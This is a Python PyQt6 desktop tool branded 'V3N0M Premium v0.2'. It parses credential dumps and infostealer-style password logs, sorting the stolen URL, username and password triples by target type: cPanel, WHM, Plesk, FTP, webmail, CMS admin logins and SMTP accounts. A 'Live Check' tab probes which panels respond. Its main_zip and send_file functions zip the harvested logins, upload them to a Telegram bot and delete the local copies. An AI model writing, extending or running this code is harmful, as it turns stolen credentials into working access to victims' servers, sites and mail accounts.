import os
import re
import sys
import time
import shutil
import socket
import zipfile
import tempfile
import requests
import threading
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                            QLabel, QPushButton, QComboBox, QTextEdit, QFileDialog, 
                            QProgressBar, QListWidget, QTabWidget, QMessageBox, QCheckBox)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QIcon
import urllib.parse

class WorkerThread(QThread):
    update_progress = pyqtSignal(int)
    update_log = pyqtSignal(str)
    finished = pyqtSignal()
    
    def __init__(self, task, *args, **kwargs):
        super().__init__()
        self.task = task
        self.args = args
        self.kwargs = kwargs
        
    def run(self):
        try:
            self.task(*self.args, **self.kwargs)
        except Exception as e:
            self.update_log.emit(f"Error: {str(e)}")
        finally:
            self.finished.emit()

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("V3N0M Premium v0.2")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 900, 700)
        
        # Initialize folders list
        self.current_directory = os.getcwd()
        self.folders = [f for f in os.listdir(self.current_directory) 
                       if os.path.isdir(os.path.join(self.current_directory, f)) and f != "TXT_logs"]
        
        # Define tag template
        self.tag_template = "Generated on {date_time} | File: {file_name} | Lines: {line_count}"
        
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        
        self.main_layout = QVBoxLayout()
        self.central_widget.setLayout(self.main_layout)
        
        self.create_tabs()
        self.create_status_bar()
        
    def create_tabs(self):
        self.tabs = QTabWidget()
        self.main_layout.addWidget(self.tabs)
        
        # Tab 1: Process Text Files
        self.tab1 = QWidget()
        self.tab1_layout = QVBoxLayout()
        self.tab1.setLayout(self.tab1_layout)
        
        self.create_txt_logs_ui()
        self.tabs.addTab(self.tab1, "Process Text Files")
        
        # Tab 2: Process Folders
        self.tab2 = QWidget()
        self.tab2_layout = QVBoxLayout()
        self.tab2.setLayout(self.tab2_layout)
        
        self.create_zip_logs_ui()
        self.tabs.addTab(self.tab2, "Process Folders")
        
        # Tab 3: Live Check
        self.tab3 = QWidget()
        self.tab3_layout = QVBoxLayout()
        self.tab3.setLayout(self.tab3_layout)
        
        self.create_live_check_ui()
        self.tabs.addTab(self.tab3, "Live Check")
        
    def create_txt_logs_ui(self):
        # File selection
        file_layout = QHBoxLayout()
        self.file_label = QLabel("Input File:")
        self.file_input = QTextEdit()
        self.file_input.setMaximumHeight(30)
        self.browse_btn = QPushButton("Browse")
        self.browse_btn.clicked.connect(self.browse_input_file)
        
        file_layout.addWidget(self.file_label)
        file_layout.addWidget(self.file_input)
        file_layout.addWidget(self.browse_btn)
        self.tab1_layout.addLayout(file_layout)
        
        # Log display
        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        self.tab1_layout.addWidget(self.log_display)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.tab1_layout.addWidget(self.progress_bar)
        
        # Start button
        self.start_btn = QPushButton("Start Processing")
        self.start_btn.clicked.connect(self.start_txt_processing)
        self.tab1_layout.addWidget(self.start_btn)
        
    def create_zip_logs_ui(self):
        # Folder selection
        folder_layout = QHBoxLayout()
        self.folder_label = QLabel("Select Folder:")
        self.folder_combo = QComboBox()
        if self.folders:  # Only add items if folders exist
            self.folder_combo.addItems(self.folders)
        else:
            self.folder_combo.addItem("No folders found")
            self.folder_combo.setEnabled(False)
        
        folder_layout.addWidget(self.folder_label)
        folder_layout.addWidget(self.folder_combo)
        self.tab2_layout.addLayout(folder_layout)
        
        # Results display
        self.results_display = QTextEdit()
        self.results_display.setReadOnly(True)
        self.tab2_layout.addWidget(self.results_display)
        
        # Progress bar
        self.zip_progress_bar = QProgressBar()
        self.tab2_layout.addWidget(self.zip_progress_bar)
        
        # Start button
        self.zip_start_btn = QPushButton("Start Processing")
        self.zip_start_btn.clicked.connect(self.start_folder_processing)
        if not self.folders:
            self.zip_start_btn.setEnabled(False)
        self.tab2_layout.addWidget(self.zip_start_btn)
        
    def create_live_check_ui(self):
        # Check type selection
        check_type_layout = QHBoxLayout()
        self.check_type_label = QLabel("Check Type:")
        self.check_type_combo = QComboBox()
        self.check_type_combo.addItems(["General", "cPanel", "WHM", "WordPress", "FTP"])
        check_type_layout.addWidget(self.check_type_label)
        check_type_layout.addWidget(self.check_type_combo)
        self.tab3_layout.addLayout(check_type_layout)
        
        # Checkbox for WordPress admin path
        self.wp_admin_checkbox = QCheckBox("Check WordPress Admin Path")
        self.wp_admin_checkbox.setChecked(True)
        self.tab3_layout.addWidget(self.wp_admin_checkbox)
        
        # URL list
        url_layout = QHBoxLayout()
        self.url_label = QLabel("URLs to Check (one per line):")
        self.url_input = QTextEdit()
        self.load_urls_btn = QPushButton("Load URLs")
        self.load_urls_btn.clicked.connect(self.load_urls_from_file)
        
        url_layout.addWidget(self.url_label)
        url_layout.addWidget(self.url_input)
        url_layout.addWidget(self.load_urls_btn)
        self.tab3_layout.addLayout(url_layout)
        
        # Results list
        self.live_results = QListWidget()
        self.tab3_layout.addWidget(self.live_results)
        
        # Progress bar
        self.live_progress_bar = QProgressBar()
        self.tab3_layout.addWidget(self.live_progress_bar)
        
        # Buttons
        button_layout = QHBoxLayout()
        self.check_live_btn = QPushButton("Check Live URLs")
        self.check_live_btn.clicked.connect(self.start_live_check)
        self.save_results_btn = QPushButton("Save Results")
        self.save_results_btn.clicked.connect(self.save_live_results)
        
        button_layout.addWidget(self.check_live_btn)
        button_layout.addWidget(self.save_results_btn)
        self.tab3_layout.addLayout(button_layout)
        
    def create_status_bar(self):
        self.status_bar = self.statusBar()
        self.status_label = QLabel("Ready")
        self.status_bar.addWidget(self.status_label)
        
    def browse_input_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Input File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.file_input.setText(file_path)
            
    def load_urls_from_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Load URLs from File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                urls = f.read()
                self.url_input.setPlainText(urls)
                
    def save_live_results(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Live Results", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            with open(file_path, 'w', encoding='utf-8') as f:
                for i in range(self.live_results.count()):
                    f.write(self.live_results.item(i).text() + "\n")
                    
    def start_txt_processing(self):
        input_file = self.file_input.toPlainText()
        if not input_file or not os.path.exists(input_file):
            QMessageBox.warning(self, "Error", "Please select a valid input file.")
            return
            
        self.start_btn.setEnabled(False)
        self.log_display.clear()
        
        self.worker = WorkerThread(self.process_txt_file, input_file)
        self.worker.update_log.connect(self.update_log_display)
        self.worker.update_progress.connect(self.update_progress_bar)
        self.worker.finished.connect(self.on_txt_processing_finished)
        self.worker.start()
        
    def process_txt_file(self, input_file):
        def filer(line):
            try:
                line = self.add_http_if_missing(line)
                
                # Handle cPanel/WHM/webmail/plesk with ports
                for port in [':2083', ':2082', ':2087', ':2086', ':2096', ':8443', ':21']:
                    if port in line:
                        host = self.safe_extract(r'://([^:/]+)', line)
                        if not host:
                            return
                        
                        clean_line = line.replace('http://', '').replace('https://', '').replace(port, '')
                        parts = self.safe_split(clean_line, ':', 3)
                        if not parts or len(parts) < 3:
                            return
                        
                        user = parts[1]
                        password = parts[2]
                        
                        file_map = {
                            ':2083': 'cpanels.txt',
                            ':2082': 'cpanels.txt',
                            ':2087': 'whm.txt',
                            ':2086': 'whm.txt',
                            ':2096': 'webmails.txt',
                            ':8443': 'plesk.txt',
                            ':21': 'Logins_Ftp.txt'
                        }
                        
                        formatted_entry = f'http://{host}{port}|{user}|{password}'
                        with open(file_map[port], 'a') as f:
                            f.write(formatted_entry + '\n')
                        self.worker.update_log.emit(formatted_entry)
                        return

                # Handle WordPress/Joomla/Prestashop/Laravel/Drupal
                cms_patterns = {
                    '/wp-login.php': 'WordPress.txt',
                    '/administrator/': 'Logins_Joomla.txt',
                    '/admin/': 'Logins_Prestashop.txt',
                    '/login': 'Logins_Laravel.txt',
                    '/user/login': 'Logins_Drupal.txt'
                }
                
                for pattern, filename in cms_patterns.items():
                    if pattern in line:
                        host = self.safe_extract(r'://([^/]+)', line)
                        if not host:
                            return
                        
                        clean_line = line.replace('http://', '').replace('https://', '')
                        parts = self.safe_split(clean_line, ':', 3)
                        if not parts or len(parts) < 3:
                            return
                        
                        protocol = 'https' if 'https://' in line else 'http'
                        form = f'{protocol}://{parts[0]}#{parts[1]}@{parts[2]}'
                        
                        with open(filename, 'a') as f:
                            f.write(form + '\n')
                        self.worker.update_log.emit(form)
                        return

                # Handle email services
                email_services = {
                    'microsoftonline.': ('smtp.office365.com', 587, 'Office365_SMTPs.txt'),
                    'zoho.': ('smtp.zoho.com', 587, 'Zoho_SMTPs.txt'),
                    'aruba.it': ('smtp.aruba.it', 465, 'Aruba_SMTPs.txt'),
                    'godaddy.com': ('smtpout.secureserver.net', 465, 'Godaddy_SMTPs.txt'),
                    '.ionos.': ('smtp.ionos.com', 465, 'Ionos_SMTPs.txt')
                }
                
                for service, (hostname, port, filename) in email_services.items():
                    if service in line:
                        host = self.safe_extract(r'://([^/]+)', line)
                        if not host:
                            return
                        
                        clean_line = line.replace('http://', '').replace('https://', '')
                        parts = self.safe_split(clean_line, ':', 3)
                        if not parts or len(parts) < 3:
                            return
                        
                        user = parts[1]
                        password = parts[2]
                        form = f'{hostname}|{port}|{user}|{password}'
                        
                        with open(filename, 'a') as f:
                            f.write(form + '\n')
                        self.worker.update_log.emit(form)
                        return
                        
            except Exception as e:
                self.worker.update_log.emit(f"Error processing line: {e}")

        try:
            with open(input_file, mode='r', errors='ignore') as f:
                target = [line.strip() for line in f.readlines() if line.strip()]
                
            total = len(target)
            for i, line in enumerate(target):
                filer(line)
                progress = int((i + 1) / total * 100)
                self.worker.update_progress.emit(progress)
                
            self.process_webmails('webmails.txt', 'SMTPs.txt')
            self.append_tag_to_files()
            self.main_zip()
            
        except Exception as e:
            self.worker.update_log.emit(f"Error processing file: {e}")
            
    def on_txt_processing_finished(self):
        self.start_btn.setEnabled(True)
        self.status_label.setText("Text file processing completed")
        
    def start_folder_processing(self):
        selected_folder = self.folder_combo.currentText()
        if not selected_folder or selected_folder == "No folders found":
            QMessageBox.warning(self, "Error", "Please select a valid folder to process.")
            return
            
        self.zip_start_btn.setEnabled(False)
        self.results_display.clear()
        
        self.worker = WorkerThread(self.process_folder, selected_folder)
        self.worker.update_log.connect(self.update_results_display)
        self.worker.update_progress.connect(self.update_zip_progress_bar)
        self.worker.finished.connect(self.on_folder_processing_finished)
        self.worker.start()
        
    def process_folder(self, folder):
        output_filename = os.path.join(self.current_directory, "passwords.txt")
        total_count, all_entries = self.merge_and_format_passwords(
            os.path.join(self.current_directory, folder), 
            output_filename
        )
        
        # Create all output files to prevent errors
        output_files = [
            'cpanels.txt', 'plesk.txt', 'Logins_Drupal.txt', 'Logins_Joomla.txt',
            'Logins_Laravel.txt', 'Logins_Prestashop.txt', 'webmails.txt',
            'whm.txt', 'WordPress.txt', 'SMTPs.txt', 'Office365_SMTPs.txt',
            'Zoho_SMTPs.txt', 'Aruba_SMTPs.txt', 'Logins_Ftp.txt',
            'Godaddy_SMTPs.txt', 'Ionos_SMTPs.txt'
        ]
        
        for file in output_files:
            if not os.path.exists(file):
                open(file, 'w').close()
                
        # Process each password entry
        def filer(line):
            try:
                line = self.add_http_if_missing(line)
                
                # Handle ports
                for port in [':2083', ':2082', ':2087', ':2086', ':2096', ':8443', ':21']:
                    if port in line:
                        host = self.safe_extract(r'://([^:/]+)', line)
                        if not host:
                            return None
                        
                        clean_line = line.replace('http://', '').replace('https://', '').replace(port, '')
                        parts = self.safe_split(clean_line, ':', 3)
                        if not parts or len(parts) < 3:
                            return None
                        
                        user = parts[1]
                        password = parts[2]
                        
                        file_map = {
                            ':2083': 'cpanels.txt',
                            ':2082': 'cpanels.txt',
                            ':2087': 'whm.txt',
                            ':2086': 'whm.txt',
                            ':2096': 'webmails.txt',
                            ':8443': 'plesk.txt',
                            ':21': 'Logins_Ftp.txt'
                        }
                        
                        formatted_entry = f'http://{host}{port}|{user}|{password}'
                        with open(file_map[port], 'a') as f:
                            f.write(formatted_entry + '\n')
                        return file_map[port].replace('.txt', '')

                # Handle CMS patterns
                cms_patterns = {
                    '/wp-login.php': 'WordPress.txt',
                    '/administrator/': 'Logins_Joomla.txt',
                    '/admin/': 'Logins_Prestashop.txt',
                    '/login': 'Logins_Laravel.txt',
                    '/user/login': 'Logins_Drupal.txt'
                }
                
                for pattern, filename in cms_patterns.items():
                    if pattern in line:
                        host = self.safe_extract(r'://([^/]+)', line)
                        if not host:
                            return None
                        
                        clean_line = line.replace('http://', '').replace('https://', '')
                        parts = self.safe_split(clean_line, ':', 3)
                        if not parts or len(parts) < 3:
                            return None
                        
                        protocol = 'https' if 'https://' in line else 'http'
                        form = f'{protocol}://{parts[0]}#{parts[1]}@{parts[2]}'
                        
                        with open(filename, 'a') as f:
                            f.write(form + '\n')
                        return filename.replace('.txt', '')

                # Handle email services
                email_services = {
                    'microsoftonline.': ('smtp.office365.com', 587, 'Office365_SMTPs.txt'),
                    'zoho.': ('smtp.zoho.com', 587, 'Zoho_SMTPs.txt'),
                    'aruba.it': ('smtp.aruba.it', 465, 'Aruba_SMTPs.txt'),
                    'godaddy.com': ('smtpout.secureserver.net', 465, 'Godaddy_SMTPs.txt'),
                    '.ionos.': ('smtp.ionos.com', 465, 'Ionos_SMTPs.txt')
                }
                
                for service, (hostname, port, filename) in email_services.items():
                    if service in line:
                        host = self.safe_extract(r'://([^/]+)', line)
                        if not host:
                            return None
                        
                        clean_line = line.replace('http://', '').replace('https://', '')
                        parts = self.safe_split(clean_line, ':', 3)
                        if not parts or len(parts) < 3:
                            return None
                        
                        user = parts[1]
                        password = parts[2]
                        form = f'{hostname}|{port}|{user}|{password}'
                        
                        with open(filename, 'a') as f:
                            f.write(form + '\n')
                        return filename.replace('.txt', '')
                        
            except Exception as e:
                self.worker.update_log.emit(f"Error processing line: {e}")
                return None
        
        # Process lines
        summary = {key: 0 for key in [
            'cpanels', 'whm', 'webmails', 'plesk', 'WordPress', 
            'Logins_Joomla', 'Logins_Prestashop', 'Logins_Laravel', 
            'Logins_Drupal', 'Office365_SMTPs', 'Zoho_SMTPs', 
            'Aruba_SMTPs', 'Logins_Ftp', 'Godaddy_SMTPs', 'Ionos_SMTPs'
        ]}
        
        total = len(all_entries)
        for i, line in enumerate(all_entries):
            result = filer(line)
            if result and result in summary:
                summary[result] += 1
                
            progress = int((i + 1) / total * 100)
            self.worker.update_progress.emit(progress)
        
        # Print summary
        self.worker.update_log.emit("\nResults Summary:")
        for key, count in summary.items():
            if count > 0:
                self.worker.update_log.emit(f"{key}: {count}")
                
        # Move files to ZIP_LOGS folder
        files_to_move = [
            'cpanels.txt', 'plesk.txt', 'Logins_Drupal.txt', 'Logins_Joomla.txt',
            'Logins_Laravel.txt', 'Logins_Prestashop.txt', 'webmails.txt',
            'whm.txt', 'WordPress.txt', 'passwords.txt', 'Office365_SMTPs.txt',
            'Zoho_SMTPs.txt', 'Aruba_SMTPs.txt', 'Logins_Ftp.txt',
            'Godaddy_SMTPs.txt', 'Ionos_SMTPs.txt'
        ]
        
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        folder_name = f"ZIP_LOGS_{now}"
        os.makedirs(folder_name, exist_ok=True)
        
        for file_name in files_to_move:
            if os.path.exists(file_name) and os.path.getsize(file_name) > 0:
                try:
                    shutil.move(file_name, os.path.join(folder_name, file_name))
                except Exception as e:
                    self.worker.update_log.emit(f"Error moving {file_name}: {e}")
        
        self.worker.update_log.emit(f"\nFiles moved to {folder_name}")
        
    def on_folder_processing_finished(self):
        self.zip_start_btn.setEnabled(True)
        self.status_label.setText("Folder processing completed")
        
    def start_live_check(self):
        urls = self.url_input.toPlainText().split('\n')
        if not urls:
            QMessageBox.warning(self, "Error", "Please enter URLs to check.")
            return
            
        self.check_live_btn.setEnabled(False)
        self.live_results.clear()
        
        self.worker = WorkerThread(self.check_urls_live, urls)
        self.worker.update_log.connect(self.update_live_results)
        self.worker.update_progress.connect(self.update_live_progress_bar)
        self.worker.finished.connect(self.on_live_check_finished)
        self.worker.start()
        
    def try_request(self, url):
        try:
            response = requests.head(url, timeout=10, allow_redirects=True)
            return response.status_code, None
        except requests.exceptions.SSLError:
            try:
                response = requests.head(url, timeout=10, allow_redirects=True, verify=False)
                return response.status_code, "SSL Bypassed"
            except Exception as e:
                return None, str(e)
        except Exception as e:
            return None, str(e)
    
    def check_general(self, url):
        url = self.add_http_if_missing(url.strip())
        if not url:
            return None
        status, ssl_info = self.try_request(url)
        if status is not None and status < 400:
            return f"[LIVE] {url} (Status: {status}" + (f", {ssl_info}" if ssl_info else "") + ")"
        else:
            error = ssl_info if ssl_info else f"Status: {status}" if status else "Unknown error"
            return f"[DEAD] {url} (Error: {error})"
    
    def check_cpanel(self, url):
        original_url = self.add_http_if_missing(url.strip())
        if not original_url:
            return None

        parsed = urllib.parse.urlparse(original_url)
        domain = parsed.netloc.split(':')[0]  # remove port if present

        attempts = []
        
        # Always try the original URL first
        attempts.append(original_url)
        
        # Add standard cPanel ports
        attempts.append(f"https://{domain}:2083")
        attempts.append(f"http://{domain}:2082")
        attempts.append(f"https://{domain}:2087")
        attempts.append(f"http://{domain}:2086")
        
        # Add common cPanel paths
        paths = ["/cpanel", "/webmail", "/", ""]
        for path in paths:
            attempts.append(f"https://{domain}{path}")
            attempts.append(f"http://{domain}{path}")

        # Try each attempt
        for attempt in attempts:
            status, ssl_info = self.try_request(attempt)
            if status is not None and status < 400:
                # Check for cPanel-specific keywords
                try:
                    response = requests.get(attempt, timeout=5, verify=False)
                    if "cPanel" in response.text or "WHM" in response.text:
                        return f"[LIVE] {attempt} (Status: {status}" + (f", {ssl_info}" if ssl_info else "") + ") [cPanel]"
                except:
                    pass
        return f"[DEAD] {url} (All cPanel attempts failed)"
    
    def check_whm(self, url):
        original_url = self.add_http_if_missing(url.strip())
        if not original_url:
            return None

        parsed = urllib.parse.urlparse(original_url)
        domain = parsed.netloc.split(':')[0]  # remove port if present

        attempts = []
        attempts.append(original_url)
        
        # Standard WHM ports
        attempts.append(f"https://{domain}:2087")
        attempts.append(f"http://{domain}:2086")
        
        # WHM specific paths
        attempts.append(f"https://{domain}:2087/login")
        attempts.append(f"http://{domain}:2086/login")
        
        # Try each attempt
        for attempt in attempts:
            status, ssl_info = self.try_request(attempt)
            if status is not None and status < 400:
                # Check for WHM-specific keywords
                try:
                    response = requests.get(attempt, timeout=5, verify=False)
                    if "WHM" in response.text or "WebHost Manager" in response.text:
                        return f"[LIVE] {attempt} (Status: {status}" + (f", {ssl_info}" if ssl_info else "") + ") [WHM]"
                except:
                    pass
        return f"[DEAD] {url} (All WHM attempts failed)"
    
    def check_wordpress(self, url):
        original_url = self.add_http_if_missing(url.strip())
        if not original_url:
            return None

        # If the URL doesn't end with /wp-login.php, try it
        attempts = [original_url]
        
        # Add admin path if requested
        if self.wp_admin_checkbox.isChecked():
            base = original_url.rstrip('/')
            attempts.append(base + '/wp-login.php')
            attempts.append(base + '/wp-admin')
            attempts.append(base + '/login')
            attempts.append(base + '/admin')
        
        # Add common WordPress paths
        paths = ["/", "/blog", "/wordpress", "/wp", ""]
        for path in paths:
            attempts.append(f"{original_url.rstrip('/')}{path}")

        # Try each attempt
        for attempt in attempts:
            status, ssl_info = self.try_request(attempt)
            if status is not None and status < 400:
                # Check for WordPress-specific keywords
                try:
                    response = requests.get(attempt, timeout=5, verify=False)
                    if "wp-content" in response.text or "WordPress" in response.text:
                        return f"[LIVE] {attempt} (Status: {status}" + (f", {ssl_info}" if ssl_info else "") + ") [WordPress]"
                except:
                    pass
        return f"[DEAD] {url} (WordPress login not found)"
    
    def check_ftp(self, url):
        clean_url = url.strip()
        if not clean_url:
            return None

        # Remove any scheme and get the domain part
        if '://' in clean_url:
            domain = clean_url.split('://')[1].split('/')[0]
        else:
            domain = clean_url.split('/')[0]

        # Remove port if present
        domain = domain.split(':')[0]

        try:
            # Try to connect to FTP port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((domain, 21))
            
            # Read banner to confirm it's FTP
            banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
            s.close()
            
            if "FTP" in banner or "FileZilla" in banner or "vsFTPd" in banner:
                return f"[LIVE] ftp://{domain}:21 (Banner: {banner})"
            else:
                return f"[DEAD] ftp://{domain}:21 (Not FTP service)"
        except Exception as e:
            return f"[DEAD] ftp://{domain}:21 (Error: {str(e)})"
    
    def check_urls_live(self, urls):
        check_type = self.check_type_combo.currentText()
        
        total = len(urls)
        for i, url in enumerate(urls):
            if not url.strip():
                continue
                
            if check_type == "General":
                result = self.check_general(url)
            elif check_type == "cPanel":
                result = self.check_cpanel(url)
            elif check_type == "WHM":
                result = self.check_whm(url)
            elif check_type == "WordPress":
                result = self.check_wordpress(url)
            elif check_type == "FTP":
                result = self.check_ftp(url)
            else:
                result = f"Unknown check type: {check_type}"
                
            if result:
                self.worker.update_log.emit(result)
                
            progress = int((i + 1) / total * 100)
            self.worker.update_progress.emit(progress)
            
    def on_live_check_finished(self):
        self.check_live_btn.setEnabled(True)
        self.status_label.setText("Live check completed")
        
    def update_log_display(self, message):
        self.log_display.append(message)
        
    def update_results_display(self, message):
        self.results_display.append(message)
        
    def update_live_results(self, message):
        self.live_results.addItem(message)
        
    def update_progress_bar(self, value):
        self.progress_bar.setValue(value)
        
    def update_zip_progress_bar(self, value):
        self.zip_progress_bar.setValue(value)
        
    def update_live_progress_bar(self, value):
        self.live_progress_bar.setValue(value)
        
    # Utility methods from original code
    def add_http_if_missing(self, url):
        if not url.startswith(('http://', 'https://')):
            return 'http://' + url
        return url

    def safe_extract(self, pattern, text):
        match = re.search(pattern, text)
        return match.group(1) if match else ""

    def safe_split(self, text, delimiter, min_parts):
        parts = text.split(delimiter)
        return parts if len(parts) >= min_parts else None
        
    def merge_and_format_passwords(self, folder, output_file):
        password_file_pattern = re.compile(r".*password.*\.txt", re.IGNORECASE)
        entry_pattern = re.compile(
            r"(?i)URL:\s*(https?://\S+)\s*\n(?:Username|Login|Email):\s*(\S+)\s*\n(?:Password|Pass):\s*(\S+)",
            re.IGNORECASE
        )

        total_count = 0
        all_entries = []
        
        for root, dirs, files in os.walk(folder):
            for file in files:
                if password_file_pattern.match(file):
                    file_path = os.path.join(root, file)
                    file_read = False
                    encodings = ['utf-8', 'latin-1', 'utf-16', 'utf-32']
                    
                    for encoding in encodings:
                        if file_read:
                            break
                        try:
                            with open(file_path, 'r', encoding=encoding, errors='ignore') as infile:
                                content = infile.read()
                                matches = entry_pattern.findall(content)
                                total_count += len(matches)
                                for match in matches:
                                    url, user, password = match[:3]
                                    filtered_entry = f"{url}:{user}:{password}"
                                    all_entries.append(filtered_entry)
                            file_read = True
                        except (UnicodeDecodeError, FileNotFoundError):
                            continue
        
        with open(output_file, 'w', encoding='utf-8') as outfile:
            outfile.write("\n".join(all_entries) + "\n")
        
        self.worker.update_log.emit(f"Total passwords found: {total_count}")
        return total_count, all_entries
        
    def process_webmails(self, input_file_name, output_file_name):
        processed_lines = []
        if os.path.exists(input_file_name) and os.path.getsize(input_file_name) > 0:
            try:
                with open(input_file_name, 'r', encoding='latin-1') as file:
                    for line in file:
                        line = line.strip()
                        if line:
                            parts = line.split('|')
                            if len(parts) == 3:
                                url_parts = parts[0].split(':')
                                if len(url_parts) >= 2:
                                    host = url_parts[1].replace('//', '')
                                    port = "587"
                                    email = parts[1]
                                    password = parts[2]
                                    processed_line = f"{host}|{port}|{email}|{password}"
                                    processed_lines.append(processed_line)
                if processed_lines:
                    with open(output_file_name, 'w', encoding='utf-8') as file:
                        file.write('\n'.join(processed_lines))
            except Exception as e:
                self.worker.update_log.emit(f"Error processing webmails: {e}")
                
    def append_tag_to_files(self):
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        output_directory = f'TXT_logs_{now}'
        
        target_files = [
            'cpanels.txt', 'plesk.txt', 'Logins_Drupal.txt', 'Logins_Joomla.txt',
            'Logins_Laravel.txt', 'Logins_Prestashop.txt', 'webmails.txt',
            'whm.txt', 'WordPress.txt', 'SMTPs.txt', 'Office365_SMTPs.txt',
            'Zoho_SMTPs.txt', 'Aruba_SMTPs.txt', 'Logins_Ftp.txt',
            'Godaddy_SMTPs.txt', 'Ionos_SMTPs.txt'
        ]
        
        # Create output files if they don't exist to prevent errors
        for file in target_files:
            if not os.path.exists(file):
                open(file, 'w').close()
        
        self.append_tag_to_files_with_template('.', target_files, output_directory)

    def append_tag_to_files_with_template(self, directory, target_files, output_directory):
        if not os.path.exists(output_directory):
            os.makedirs(output_directory)
        
        def read_file(file_path):
            encodings = ['utf-8', 'latin-1', 'utf-16', 'utf-32']
            for encoding in encodings:
                try:
                    with open(file_path, 'r', encoding=encoding, errors='ignore') as file:
                        return file.readlines()
                except UnicodeDecodeError:
                    continue
            return []
        
        for txt_file in target_files:
            file_path = os.path.join(directory, txt_file)
            if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                output_file_path = os.path.join(output_directory, txt_file)
                try:
                    lines = read_file(file_path)
                    if not lines:
                        continue
                        
                    num_lines = len(lines)
                    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    tag = self.tag_template.format(
                        date_time=now,
                        file_name=txt_file,
                        line_count=num_lines
                    )
                    
                    with open(output_file_path, 'w', encoding='utf-8') as file:
                        file.write(tag + '\n')
                        file.writelines(lines)
                        file.write('\n' + tag)
                    
                    self.worker.update_log.emit(f"Tag appended to {txt_file}")
                except Exception as e:
                    self.worker.update_log.emit(f"Error processing {txt_file}: {e}")
            else:
                self.worker.update_log.emit(f"File not found or empty: {txt_file}")
                
    def main_zip(self):
        bot_token = "empty"  # Replace with actual token
        chat_id = "empty"    # Replace with actual chat ID
        target_files = [
            'cpanels.txt', 'plesk.txt', 'Logins_Drupal.txt', 'Logins_Joomla.txt',
            'Logins_Laravel.txt', 'Logins_Prestashop.txt', 'webmails.txt',
            'whm.txt', 'WordPress.txt', 'SMTPs.txt', 'Office365_SMTPs.txt',
            'Zoho_SMTPs.txt', 'Aruba_SMTPs.txt', 'Logins_Ftp.txt',
            'Godaddy_SMTPs.txt', 'Ionos_SMTPs.txt'
        ]
        
        # Filter only files that exist and have content
        valid_files = [f for f in target_files if os.path.exists(f) and os.path.getsize(f) > 0]
        
        if not valid_files:
            self.worker.update_log.emit("No valid files to zip")
            return
            
        current_time = datetime.now().strftime("%Y%m%d%H%M%S")
        temp_dir = tempfile.gettempdir()
        zip_name = os.path.join(temp_dir, f'logs_{current_time}.zip')
        zip_password = "empty"  # Replace with actual password
        
        self.create_zip(zip_name, zip_password, valid_files)
        
        if os.path.exists(zip_name):
            if self.send_file(bot_token, chat_id, zip_name):
                self.worker.update_log.emit("Files sent successfully")
                self.delete_file(zip_name)
                for file_name in valid_files:
                    self.delete_file(file_name)
            else:
                self.worker.update_log.emit("")
        else:
            self.worker.update_log.emit("Zip file creation failed")
        
    def send_file(self, bot_token, chat_id, file_name):
        if not bot_token or not chat_id or bot_token == "empty" or chat_id == "empty":
            self.worker.update_log.emit("")
            return False
        
        url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
        try:
            with open(file_name, 'rb') as file:
                response = requests.post(url, data={'chat_id': chat_id}, files={'document': file})
                return response.status_code == 200
        except Exception:
            return False
    
    def create_zip(self, zip_name, password, files):
        try:
            # Try using pyminizip if available
            try:
                import pyminizip
                compression_level = 5
                pyminizip.compress_multiple(files, [], zip_name, password, compression_level)
                return
            except ImportError:
                pass
            
            # Fallback to zipfile
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in files:
                    if os.path.exists(file):
                        zipf.write(file)
        except Exception as e:
            self.worker.update_log.emit(f"Error creating zip: {e}")
    
    def delete_file(self, file_name):
        try:
            if os.path.exists(file_name):
                os.remove(file_name)
        except Exception as e:
            self.worker.update_log.emit(f"Error deleting file: {e}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application style
    app.setStyle('Fusion')
    
    # Set application font
    font = QFont()
    font.setFamily("Segoe UI")
    font.setPointSize(10)
    app.setFont(font)
    
    window = MainWindow()
    window.show()
    sys.exit(app.exec())